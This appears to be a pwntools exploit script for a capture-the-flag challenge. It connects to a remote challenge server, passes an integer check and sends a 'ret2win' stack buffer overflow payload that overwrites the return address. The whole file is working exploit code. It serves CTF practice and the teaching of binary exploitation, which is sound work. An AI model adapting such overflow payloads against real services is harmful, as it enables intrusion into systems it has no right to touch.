#!/usr/bin/env python3
from pwn import *

context.update(arch='x86')
exe = './chall'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
p = remote("gc1.eng.run", 32096)
p.recv()
p.sendline(b"1")

p.recv()
p.sendline(b"536870912")

#ret2win
pause()
p.recv()
p.sendline(b"A"*(36) + p32(0x080492e4) + b"B"*(262-4-36))


p.interactive()

